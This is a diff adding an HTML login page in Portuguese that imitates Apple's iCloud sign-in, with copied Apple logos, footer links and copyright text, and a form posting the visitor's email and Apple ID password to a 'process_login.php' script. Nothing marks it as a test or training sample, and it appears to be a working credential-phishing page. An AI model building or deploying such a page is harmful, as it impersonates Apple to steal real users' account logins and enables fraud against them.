@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iCloud Login</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background-color: #f0f0f5;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .header {
+            width: 100%;
+            padding: 1em;
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            background-color: #fff;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            position: absolute;
+            top: 0;
+            text-decoration: none;
+        }
+        .header img {
+            width: 24px;
+            height: 24px;
+            margin-right: 8px;
+        }
+        .header span {
+            font-size: 1.2em;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        .container {
+            text-align: center;
+            background: #fff;
+            padding: 3em;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 500px;
+            margin: 2em 1em;
+        }
+        .icloud-logo {
+            margin-bottom: 2em;
+        }
+        .icloud-logo img {
+            width: 150px;
+            height: 150px;
+        }
+        .sign-in-label {
+            font-size: 1.5em;
+            margin-bottom: 2em;
+        }
+        .input-container {
+            margin-bottom: 2em;
+            position: relative;
+        }
+        .input-container input {
+            width: 100%;
+            padding: 1em;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 1.1em;
+        }
+        .button {
+            padding: 1em;
+            background-color: #007aff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 1.1em;
+        }
+        .button:hover {
+            background-color: #005bb5;
+        }
+        .legal-footer {
+            margin-top: 2em;
+            font-size: 0.9em;
+            color: #555;
+            text-align: center;
+        }
+        .legal-footer a {
+            color: #007aff;
+            text-decoration: none;
+            margin: 0 0.5em;
+        }
+        .legal-footer a:hover {
+            text-decoration: underline;
+        }
+        .legal-footer .separator {
+            margin: 0 0.5em;
+            color: #ccc;
+        }
+        footer {
+            width: 100%;
+            padding: 1em;
+            background-color: #fff;
+            position: absolute;
+            bottom: 0;
+            text-align: center;
+            box-shadow: 0 -2px 4px rgba(0,0,0,0.1);
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <a href="/" aria-label="Aceda à página inicial em icloud.com" style="text-decoration: none; display: flex; align-items: center;">
+            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MiIgaGVpZ2h0PSIzMSIgdmlld0JveD0iMCAwIDgyIDMxIj48ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9Im5vbnplcm8iPjxwYXRoIGQ9Ik0xNi45MDcgMTYuNWgyLjU1VjUuNDIzaC0yLjU1VjE2LjUwem0xLjI4Ny0xMi44MzJjLjQxMiAwIC43NjMtLjE0NCAxLjA1LS40MzBhMS40MSAxLjQxIDAgMCAwIC40MzItMS4wMzNjMC0uNDA3LS4xNDQtLjc1My0uNDMyLTEuMDM4YTEuNDQ1IDEuNDQ1IDAgMCAwLTEuMDUtLjQyNmMtLjQwNyAwLS43NTYuMTQyLTEuMDQ2LjQyNi0uMjkxLjI4NS0uNDM3LjYzLS40MzcgMS4wMzggMCAuNDAxLjE0Ni43NDUuNDM3IDEuMDMyLjI5LjI4Ny42NC40MyAxLjA0Ni40MXYuMDAxem05LjkxNSAxMy4xNTZjMS4xNCAwIDIuMTU3LS4yMSAzLjA1Mi0uNjMxLjg2NC0uMzk1IDEuNjE2LTEgMi4xODgtMS43NTguNTYzLS43NTIuOTA4LTEuNjI0IDEuMDM3LTIuNjE5bC4wMDctLjA5MWgtMi41OTRsLS4wMjEuMDc2YTMuNTggMy41OCAwIDAgMS0uNzEzIDEuNDY1IDMuMzUgMy4zNSAwIDAgMS0xLjI1OC45NDNjLS41LjIxOS0xLjA2NS4zMjgtMS42OTUuMzI4LS44NDcgMC0xLjU4Mi0uMjItMi4yMDQtLjY2My0uNjIzLS40NDItMS4xMDMtMS4wNy0xLjQ0MS0xLjg4NC0uMzM4LS44MTMtLjUwNy0xLjc3Ni0uNTA3LTIuODg2di0uMDE2YzAtMS4xMTUuMTctMi4wNzYuNTA3LTIuODg2LjMzOC0uODEuODE3LTEuNDM0IDEuNDM5LTEuODc1LjYyLS40NCAxLjM1NC0uNjYgMi4xOTktLjY2LjYzNCAwIDEuMjAxLjExNyAxLjcwMi4zNTEuNTAxLjIzNS45Mi41NjUgMS4yNTcuOTkuMzM4LjQyNS41NzIuOTI2LjcwNSAxLjUwNWwuMDI2LjEwNWgyLjU5bC0uMDA0LS4wOTNjLS4xMTgtMS4wMDYtLjQ2LTEuODk1LTEuMDI4LTIuNjY4YTUuODg2IDUuODg2IDAgMCAwLTIuMjA0LTEuODE5Yy0uOTAxLS40MzktMS45MTYtLjY1OC0zLjA0NC0uNjU4LTEuNDA1IDAtMi42MTkuMzExLTMuNjQyLjkzNS0xLjAyMi42MjQtMS44MTIgMS41MTEtMi4zNjggMi42NjMtLjU1NiAxLjE1Mi0uODM0IDIuNTIzLS44MzQgNC4xMTN2LjAxNmMwIDEuNTg4LjI3OCAyLjk1OC44MzQgNC4xMS41NTUgMS4xNTQgMS4zNDYgMi4wNDMgMi4zNzIgMi42NjkgMS4wMjYuNjI1IDIuMjQgLjkzOCAzLjY0Mi45MzhabTguMDM0LS4zMjRoMi41NVYxLjI0aC0yLjU1VjE2LjV6bTkLjUzNC4yMjJjMS4xIDAgMi4wNDktLjIzMSAyLjg0Ni0uNjkzLjc5Ny0uNDYxIDEuNDEzLTEuMTIyIDEuODQ2LTEuOTgyLjQzNC0uODYuNjUtMS44ODYuNjUtMy4wOHYtLjAyYzAtMS4xOTEtLjIxOC0yLjIxNi0uNjU1LTMuMDc0YTUuMjQgNS4yNCAwIDAgMC0xLjg1Mi0xLjk4Yy0uNzk4LS40Ni0xLjc0NC0uNjkxLTIuODM4LS42OTEtMS4wODYgMC0yLjAzLjIzLTIuODI5LjY5NGE0LjY5IDQuNjkgMCAwIDAtMS44NTUgMS45ODFjLS40MzguODU5LS42NTYgMS44ODItLjY1NiAzLjA3di4wMmMwIDEuMTkxLjIxNiAyLjIxNy42NSAzLjA3OC40MzQuODYgMS4wNSAxLjUyMiAxLjg1IDEuOTg0LjgwLjQ2MiAxLjc0Ny42OTMgMi44NDMuNjkzem0uMDA0LTIuMDY2Yy0uNTcyIDAtMS4wNjMtLjE0Ni0xLjQ3Mi0uNDM2LS40MDgtLjI5MS0uNzIyLS43MTEtLjk0MS0xLjI2MS0uMjE5LS41NS0uMzI5LTEuMjEzLS4zMjktMS45OTB2LS4wMmMwLS43NzYuMTEtMS40MzguMzMtMS45ODUuMjItLjU0OC41MzUtLjk2Ny45NDQtMS4yNTkuNDA4LS4yOTEuODk2LS40MzcuMTQ2LS40Mzd6bTEwLjU5NiAyLjA2NmMuNDk3LjAwOC45OTEtLjA3MSAxLjQ2LS4yMzMuNDMtLjE1Ni43OTgtLjM3OCAxLjEwNi0uNjY4LjMwOS0uMjkuNTU3LS42MzkuNzMtMS4wMjZoLjEzVjE2LjVoMi41NVY1LjQyM2gtMi41NXY2LjQ0NGMwIC40MS0uMDU1Ljc4Mi0uMTY1IDEuMTE0YTIuMzMgMi4zMyAwIDAgMS0uNDg1Ljg1MyAyLjE1MyAyLjE1MyAwIDAgMS0uNzgzLjU0NiAyLjc0NCAyLjc0NCAwIDAgMS0xLjA1NC4xOTFjLS43NTQgMC0xLjMwNy0uMjE2LTEuNjU3LS42NDctLjM1LS40MzEtLjUyNi0xLjA2My0uNTI2LTEuODk0VjUuNDIzaC0yLjU1VjEyLjU4YzAgLjg2Ny4xNDQgMS42MS40MzMgMi4yMjguMjg5LjYxOC43MTYgMS4wOSAxLjI4MSAxLjQxNi41NjYuMzI2IDEuMjU5LjQ4OSAyLjA4LjQ4OXptMTIuMDg0LS4wMjRjLjUyNSAwIDEuMDA1LS4wOCAxLjQ0MS0uMjQgYS4zNjQgMy40NTMgMCAwIDAgMS45NTUtMS43NDdoLjEzVjE2LjVoMi41NVYxLjI0aC0yLjU1djUuOTk3aC0uMTNhMy4yOTIgMy4yOTIgMCAwIDAtLjgwMi0xLjA3M2MtLjMzOC0uMy0uNzI3LS41My0xLjE2Ny0uNjk0YTMuOTMgMy45MyAwIDAgMC0xLjQzMy0uMjQ0Yy0uOTMyIDAtMS43MzkuMjMtMi40Mi42OTMtLjY4MS40NjMtMS4yMDcgMS4xMjItMS41NzkgMS45NzhzLS41NTcgMS44NzMtLjU1NyAzLjA1NXYuMDE2YzAgMS4xNzUuMTg2IDIuMTkuNTU5IDMuMDQ5LjM3Mi44NTguOSAxLjUyIDEuNTg1IDEuOTg0LjY4NC40NjQgMS40OS42OTcgMi40MTguNjk3em0uNzgzLTIuMTVjLS41NjYgMC0xLjA1NC0uMTQ1LTEuNDY2LS40MzItLjQxMi0uMjg3LS43MjgtLjY5OS0uOTUtMS4yMzUtLjIyLS41MzYtLjMzLS4xNzQtLjMzLTEuOTEzdi0uMDE2YzAtLjczMi4xMS0xLjM2Ni4zMzEtMS45MDRzLjUzOC0uOTQ0Ljk1LS4xMjNjLjQxMi0uMjg4LjkwMy0uNDMyIDEuNDY1LS40MzIuNTYuMDAxIDEuMDQ2LjE0NiAxLjQ2LjQzNi40MTMuMjkuNzM1LjcwMy45NjQgMS4yMzcuMjI4LjUzNC4zNDMuMTY5LjM0MyAxLjkzdi4wMTZjMCAuNzMyLS4xMTQgMS4zNjYtLjM0IDEuOTAyLS4yMjcuNTM2LS41NDguOTUtLjk2MyAxLjI0LS40MTUuMjktLjkwMy40MzQtMS40NjQuNDM0eiIgZmlsbD0iIzFEMUQxRiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMi41IDYuNSkiPjwvcGF0aD48L2c+PC9zdmc+">
+            <span>iCloud</span>
+        </a>
+    </div>
+    <div class="container">
+        <div class="icloud-logo">
+            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MiIgaGVpZ2h0PSIzMSIgdmlld0JveD0iMCAwIDgyIDMxIj48ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9Im5vbnplcm8iPjxwYXRoIGQ9Ik0xNi45MDcgMTYuNWgyLjU1VjUuNDIzaC0yLjU1VjE2LjUwem0xLjI4Ny0xMi44MzJjLjQxMiAwIC43NjMtLjE0NCAxLjA1LS40MzBhMS40MSAxLjQxIDAgMCAwIC40MzItMS4wMzNjMC0uNDA3LS4xNDQtLjc1My0uNDMyLTEuMDM4YTEuNDQ1IDEuNDQ1IDAgMCAwLTEuMDUtLjQyNmMtLjQwNyAwLS43NTYuMTQyLTEuMDQ2LjQyNi0uMjkxLjI4NS0uNDM3LjYzLS40MzcgMS4wMzggMCAuNDAxLjE0Ni43NDUuNDM3IDEuMDMyLjI5LjI4Ny42NC40MyAxLjA0Ni40MXYuMDAxem05LjkxNSAxMy4xNTZjMS4xNCAwIDIuMTU3LS4yMSAzLjA1Mi0uNjMxLjg2NC0uMzk1IDEuNjE2LTEgMi4xODgtMS43NTguNTYzLS43NTIuOTA4LTEuNjI0IDEuMDM3LTIuNjE5bC4wMDctLjA5MWgtMi41OTRsLS4wMjEuMDc2YTMuNTggMy41OCAwIDAgMS0uNzEzIDEuNDY1IDMuMzUgMy4zNSAwIDAgMS0xLjI1OC45NDNjLS41LjIxOS0xLjA2NS4zMjgtMS42OTUuMzI4LS44NDcgMC0xLjU4Mi0uMjItMi4yMDQtLjY2My0uNjIzLS40NDItMS4xMDMtMS4wNy0xLjQ0MS0xLjg4NC0uMzM4LS44MTMtLjUwNy0xLjc3Ni0uNTA3LTIuODg2di0uMDE2YzAtMS4xMTUuMTctMi4wNzYuNTA3LTIuODg2LjMzOC0uODEuODE3LTEuNDM0IDEuNDM5LTEuODc1LjYyLS40NCAxLjM1NC0uNjYgMi4xOTktLjY2LjYzNCAwIDEuMjAxLjExNyAxLjcwMi4zNTEuNTAxLjIzNS45Mi41NjUgMS4yNTcuOTkuMzM4LjQyNS41NzIuOTI2LjcwNSAxLjUwNWwuMDI2LjEwNWgyLjU5bC0uMDA0LS4wOTNjLS4xMTgtMS4wMDYtLjQ2LTEuODk1LTEuMDI4LTIuNjY4YTUuODg2IDUuODg2IDAgMCAwLTIuMjA0LTEuODE5Yy0uOTAxLS40MzktMS45MTYtLjY1OC0zLjA0NC0uNjU4LTEuNDA1IDAtMi42MTkuMzExLTMuNjQyLjkzNS0xLjAyMi42MjQtMS44MTIgMS41MTEtMi4zNjggMi42NjMtLjU1NiAxLjE1Mi0uODM0IDIuNTIzLS44MzQgNC4xMTN2LjAxNmMwIDEuNTg4LjI3OCAyLjk1OC44MzQgNC4xMS41NTUgMS4xNTQgMS4zNDYgMi4wNDMgMi4zNzIgMi42NjkgMS4wMjYuNjI1IDIuMjQgLjkzOCAzLjY0Mi45MzhabTguMDM0LS4zMjRoMi41NVYxLjI0aC0yLjU1VjE2LjV6bTkLjUzNC4yMjJjMS4xIDAgMi4wNDktLjIzMSAyLjg0Ni0uNjkzLjc5Ny0uNDYxIDEuNDEzLTEuMTIyIDEuODQ2LTEuOTgyLjQzNC0uODYuNjUtMS44ODYuNjUtMy4wOHYtLjAyYzAtMS4xOTEtLjIxOC0yLjIxNi0uNjU1LTMuMDc0YTUuMjQgNS4yNCAwIDAgMC0xLjg1Mi0xLjk4Yy0uNzk4LS40Ni0xLjc0NC0uNjkxLTIuODM4LS42OTEtMS4wODYgMC0yLjAzLjIzLTIuODI5LjY5NGE0LjY5IDQuNjkgMCAwIDAtMS44NTUgMS45ODFjLS40MzguODU5LS42NTYgMS44ODItLjY1NiAzLjA3di4wMmMwIDEuMTkxLjIxNiAyLjIxNy42NSAzLjA3OC40MzQuODYgMS4wNSAxLjUyMiAxLjg1IDEuOTg0LjgwLjQ2MiAxLjc0Ny42OTMgMi44NDMuNjkzem0uMDA0LTIuMDY2Yy0uNTcyIDAtMS4wNjMtLjE0Ni0xLjQ3Mi0uNDM2LS40MDgtLjI5MS0uNzIyLS43MTEtLjk0MS0xLjI2MS0uMjE5LS41NS0uMzI5LTEuMjEzLS4zMjktMS45OTB2LS4wMmMwLS43NzYuMTEtMS40MzguMzMtMS45ODUuMjItLjU0OC41MzUtLjk2Ny45NDQtMS4yNTkuNDA4LS4yOTEuODk2LS40MzcuMTQ2LS40Mzd6bTEwLjU5NiAyLjA2NmMuNDk3LjAwOC45OTEtLjA3MSAxLjQ2LS4yMzMuNDMtLjE1Ni43OTgtLjM3OCAxLjEwNi0uNjY4LjMwOS0uMjkuNTU3LS42MzkuNzMtMS4wMjZoLjEzVjE2LjVoMi41NVY1LjQyM2gtMi41NXY2LjQ0NGMwIC40MS0uMDU1Ljc4Mi0uMTY1IDEuMTE0YTIuMzMgMi4zMyAwIDAgMS0uNDg1Ljg1MyAyLjE1MyAyLjE1MyAwIDAgMS0uNzgzLjU0NiAyLjc0NCAyLjc0NCAwIDAgMS0xLjA1NC4xOTFjLS43NTQgMC0xLjMwNy0uMjE2LTEuNjU3LS42NDctLjM1LS40MzEtLjUyNi0xLjA2My0uNTI2LTEuODk0VjUuNDIzaC0yLjU1VjEyLjU4YzAgLjg2Ny4xNDQgMS42MS40MzMgMi4yMjguMjg5LjYxOC43MTYgMS4wOSAxLjI4MSAxLjQxNi41NjYuMzI2IDEuMjU5LjQ4OSAyLjA4LjQ4OXptMTIuMDg0LS4wMjRjLjUyNSAwIDEuMDA1LS4wOCAxLjQ0MS0uMjQgYS4zNjQgMy40NTMgMCAwIDAgMS45NTUtMS43NDdoLjEzVjE2LjVoMi41NVYxLjI0aC0yLjU1djUuOTk3aC0uMTNhMy4yOTIgMy4yOTIgMCAwIDAtLjgwMi0xLjA3M2MtLjMzOC0uMy0uNzI3LS41My0xLjE2Ny0uNjk0YTMuOTMgMy45MyAwIDAgMC0xLjQzMy0uMjQ0Yy0uOTMyIDAtMS43MzkuMjMtMi40Mi42OTMtLjY4MS40NjMtMS4yMDcgMS4xMjItMS41NzkgMS45NzhzLS41NTcgMS44NzMtLjU1NyAzLjA1NXYuMDE2YzAgMS4xNzUuMTg2IDIuMTkuNTU5IDMuMDQ5LjM3Mi44NTguOSAxLjUyIDEuNTg1IDEuOTg0LjY4NC40NjQgMS40OS42OTcgMi40MTguNjk3em0uNzgzLTIuMTVjLS41NjYgMC0xLjA1NC0uMTQ1LTEuNDY2LS40MzItLjQxMi0uMjg3LS43MjgtLjY5OS0uOTUtMS4yMzUtLjIyLS41MzYtLjMzLS4xNzQtLjMzLTEuOTEzdi0uMDE2YzAtLjczMi4xMS0xLjM2Ni4zMzEtMS45MDRzLjUzOC0uOTQ0Ljk1LS4xMjNjLjQxMi0uMjg4LjkwMy0uNDMyIDEuNDY1LS40MzIuNTYuMDAxIDEuMDQ2LjE0NiAxLjQ2LjQzNi40MTMuMjkuNzM1LjcwMy45NjQgMS4yMzcuMjI4LjUzNC4zNDMuMTY5LjM0MyAxLjkzdi4wMTZjMCAuNzMyLS4xMTQgMS4zNjYtLjM0IDEuOTAyLS4yMjcuNTM2LS41NDguOTUtLjk2MyAxLjI0LS40MTUuMjktLjkwMy40MzQtMS40NjQuNDM0eiIgZmlsbD0iIzFEMUQxRiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMi41IDYuNSkiPjwvcGF0aD48L2c+PC9zdmc+">
+        </div>
+        <div class="sign-in-label">Inicie sessão com o ID Apple</div>
+        <form action="process_login.php" method="POST">
+            <div class="input-container">
+                <input type="email" name="email" placeholder="E-mail" required>
+            </div>
+            <div class="input-container">
+                <input type="password" name="password" placeholder="Palavra-passe" required>
+            </div>
+            <div class="input-container">
+                <button class="button" type="submit">Iniciar Sessão</button>
+            </div>
+        </form>
+    </div>
+    <footer>
+        <div class="legal-footer">
+            <a class="systemStatus" target="_blank" rel="noreferrer" href="https://www.apple.com/support/systemstatus/" aria-label="Estado do sistema (abre num novo separador)">Estado do sistema</a>
+            <span class="separator">|</span>
+            <a class="privacy" target="_blank" rel="noreferrer" href="https://www.apple.com/legal/privacy/" aria-label="Política de privacidade (abre num novo separador)">Política de privacidade</a>
+            <span class="separator">|</span>
+            <a class="terms" target="_blank" rel="noreferrer" href="https://www.apple.com/legal/internet-services/icloud/" aria-label="Termos e condições (abre num novo separador)">Termos e condições</a>
+            <span class="copyright">Copyright © 2024 Apple&nbsp;Inc. Todos os direitos reservados.</span>
+        </div>
+    </footer>
+</body>
+</html>
